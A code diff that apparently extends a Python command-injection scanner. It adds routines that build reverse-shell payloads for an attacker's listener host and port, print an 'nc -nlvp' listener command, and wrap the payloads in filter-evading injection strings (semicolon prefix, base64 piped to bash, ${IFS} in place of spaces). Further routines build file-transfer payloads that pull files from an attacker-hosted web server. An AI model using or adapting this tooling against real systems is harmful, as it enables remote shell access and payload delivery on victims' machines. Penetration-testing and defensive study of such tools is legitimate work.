+        # Generate reverse shell payloads if requested and vulnerabilities found
+        if (args.generate_shells or args.enum_capabilities) and tester.vulnerabilities:
+            if not tester.target_capabilities:
+                print(f"\n{Colors.CYAN}[*] Enumerating capabilities for payload generation...{Colors.ENDC}")
+                tester.enumerate_capabilities(params[0], post_data)
+            
+            if args.generate_shells:
+                if not args.lhost:
+                    print(f"\n{Colors.YELLOW}[!] --lhost required for reverse shell generation{Colors.ENDC}")
+                else:
+                    print(f"\n{Colors.CYAN}{Colors.BOLD}{'='*70}{Colors.ENDC}")
+                    print(f"{Colors.CYAN}{Colors.BOLD}REVERSE SHELL PAYLOADS{Colors.ENDC}")
+                    print(f"{Colors.CYAN}{Colors.BOLD}{'='*70}{Colors.ENDC}\n")
+                    
+                    payloads = tester.generate_reverse_shell_payloads(args.lhost, args.lport)
+                    
+                    if not payloads:
+                        print(f"{Colors.YELLOW}[!] No suitable payloads based on detected capabilities{Colors.ENDC}")
+                    else:
+                        print(f"{Colors.GREEN}[+] Generated {len(payloads)} reverse shell payload(s){Colors.ENDC}\n")
+                        print(f"{Colors.YELLOW}[*] Setup listener on attack machine:{Colors.ENDC}")
+                        print(f"    nc -nlvp {args.lport}\n")
+                        
+                        for i, p in enumerate(payloads, 1):
+                            print(f"{Colors.CYAN}[{i}] {p['name']}{Colors.ENDC}")
+                            print(f"    Payload: {p['payload']}")
+                            
+                            # Show how to inject based on successful bypass
+                            if tester.successful_bypass:
+                                if 'null_statement' in tester.successful_bypass:
+                                    example = f";{p['payload']}"
+                                elif 'base64' in tester.successful_bypass:
+                                    encoded = base64.b64encode(p['payload'].encode()).decode()
+                                    example = f";`echo '{encoded}' | base64 -d | bash`"
+                                elif 'ifs' in tester.successful_bypass:
+                                    # Replace spaces with ${IFS}
+                                    example = p['payload'].replace(' ', '${IFS}')
+                                    example = f";{example}"
+                                else:
+                                    example = f";{p['payload']}"
+                                
+                                if len(example) > 100:
+                                    print(f"    Injection: {example[:100]}...")
+                                else:
+                                    print(f"    Injection: {example}")
+                            print()
+        
+        # Generate file transfer payloads if requested
+        if args.generate_transfer and tester.vulnerabilities:
+            if not tester.target_capabilities:
+                print(f"\n{Colors.CYAN}[*] Enumerating capabilities for payload generation...{Colors.ENDC}")
+                tester.enumerate_capabilities(params[0], post_data)
+            
+            if not args.lhost:
+                print(f"\n{Colors.YELLOW}[!] --lhost required for file transfer generation{Colors.ENDC}")
+            else:
+                print(f"\n{Colors.CYAN}{Colors.BOLD}{'='*70}{Colors.ENDC}")
+                print(f"{Colors.CYAN}{Colors.BOLD}FILE TRANSFER PAYLOADS{Colors.ENDC}")
+                print(f"{Colors.CYAN}{Colors.BOLD}{'='*70}{Colors.ENDC}\n")
+                
+                payloads = tester.generate_file_transfer_payloads(args.lhost, args.generate_transfer)
+                
+                if not payloads:
+                    print(f"{Colors.YELLOW}[!] No suitable payloads based on detected capabilities{Colors.ENDC}")
+                else:
+                    print(f"{Colors.GREEN}[+] Generated {len(payloads)} file transfer payload(s){Colors.ENDC}\n")
+                    print(f"{Colors.YELLOW}[*] Setup web server on attack machine:{Colors.ENDC}")
+                    print(f"    sudo cp /path/to/{args.generate_transfer} /var/www/html/")
+                    print(f"    sudo service apache2 start\n")
+                    
+                    for i, p in enumerate(payloads, 1):
+                        print(f"{Colors.CYAN}[{i}] {p['name']}{Colors.ENDC}")
+                        print(f"    {p['payload']}\n")
         
     except KeyboardInterrupt:
         print(f"\n\n{Colors.YELLOW}[!] Scan interrupted by user{Colors.ENDC}")
